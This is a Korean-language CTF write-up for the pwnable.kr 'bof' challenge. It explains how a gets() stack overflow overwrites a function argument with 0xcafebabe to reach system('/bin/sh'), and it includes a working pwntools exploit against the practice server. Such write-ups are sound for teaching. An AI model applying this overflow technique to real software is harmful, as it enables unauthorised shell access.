# [pwnable.kr] bof 문제 풀이

> 분류: Pwnable / Stack Buffer Overflow
> 목표: `gets`로 발생하는 스택 버퍼 오버플로우를 이용해 함수 인자를 덮어써 셸 획득

---

## 1. 문제 코드

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);          // 취약점: 입력 길이 제한 없음
    if(key == 0xcafebabe){
        system("/bin/sh");     // 목표: 이 분기로 진입
    }
    else{
        printf("Nah..\n");
    }
}

int main(int argc, char* argv[]){
    func(0xdeadbeef);          // key에 0xdeadbeef를 넘겨 호출
    return 0;
}
```

---

## 2. 프로그램 분석

- `main`이 `func(0xdeadbeef)`로 호출 → 인자 `key`의 값은 `0xdeadbeef`.
- `func`는 `key == 0xcafebabe`일 때만 `system("/bin/sh")`로 셸을 실행.
- 정상 실행 시에는 조건이 거짓이라 `"Nah.."`만 출력됨.
- 32비트 바이너리, 보호기법: Canary / NX / PIE 적용.

---

## 3. 취약점 분석

- 입력을 `gets(overflowme)`로 받는데, **`gets`는 입력 길이를 제한하지 않는다.**
- 버퍼(`overflowme[32]`) 크기를 넘는 데이터를 입력하면 스택의 인접 영역을 덮어쓸 수 있다.
- 이를 이용해 함수 인자 `key`의 값을 `0xcafebabe`로 덮으면 `if` 조건이 참이 되어 셸이 열린다.

---

## 4. 스택 구조 분석

gdb 디스어셈블로 확인한 `func`의 스택 프레임(32비트 기준):

- `gets`의 인자가 `[ebp-0x2C]` → 버퍼(`overflowme`)의 시작 위치.
- `key`와 `0xcafebabe`를 비교할 때 `[ebp+0x8]` → 함수 인자 `key`의 위치.

따라서 버퍼 시작부터 `key`까지의 거리:

```
[ebp+0x8] - [ebp-0x2C] = 0x34 = 52 바이트
```

스택 배치:

```
낮은 주소
┌────────────────────────┐
│ overflowme[32]  (0x20) │  ← 입력 시작
├────────────────────────┤
│ canary          (0x04) │
├────────────────────────┤
│ dummy           (0x08) │
├────────────────────────┤
│ SFP             (0x04) │
├────────────────────────┤
│ RET             (0x04) │
├────────────────────────┤
│ key             (0x04) │  ← 0xcafebabe로 덮을 대상
└────────────────────────┘
높은 주소
```

> 참고: Canary가 적용돼 있지만, `system("/bin/sh")` 호출이 Canary 검사보다 **먼저** 일어난다.
> 즉 `if` 조건을 참으로 만들어 셸을 얻고 flag를 읽은 뒤에 프로세스가 종료되므로, **Canary 값을 몰라도 상관없다.**

---

## 5. 페이로드 구성

```
payload = "A" * 52        # 버퍼 시작 ~ key 직전까지 더미로 채움 (0x34)
payload += p32(0xcafebabe) # key를 0xcafebabe로 덮음
```

---

## 6. 익스플로잇 코드 (exploit.py)

```python
from pwn import *

context(arch="i386", os="linux")

p = remote("pwnable.kr", 9000)

payload  = b"A" * 52        # overflowme ~ key 직전까지 더미
payload += p32(0xcafebabe)  # key 덮어쓰기

p.sendline(payload)
p.interactive()             # 셸 획득 후 직접 명령 입력
```

실행 후 셸이 열리면:

```bash
$ cat flag
```

---

## 7. 환경 세팅 메모 (WSL)

```bash
# Ubuntu 진입 (docker-desktop 아님에 주의)
wsl -d Ubuntu

# 가상환경에 pwntools 설치 (externally-managed 에러 회피)
sudo apt install -y python3-venv python3-full
python3 -m venv ~/pwn
source ~/pwn/bin/activate
pip install pwntools
```

---

## 8. 핵심

> `gets`로 32바이트 버퍼를 넘치게 입력해, 버퍼 뒤 **52바이트 떨어진 함수 인자 `key`를 `0xcafebabe`로 덮어쓴다.**
> 조건 분기가 참이 되어 `system("/bin/sh")`가 실행되고, 셸로 flag를 읽는다.
> Canary보다 셸 실행이 먼저 일어나므로 Canary 우회는 불필요하다.
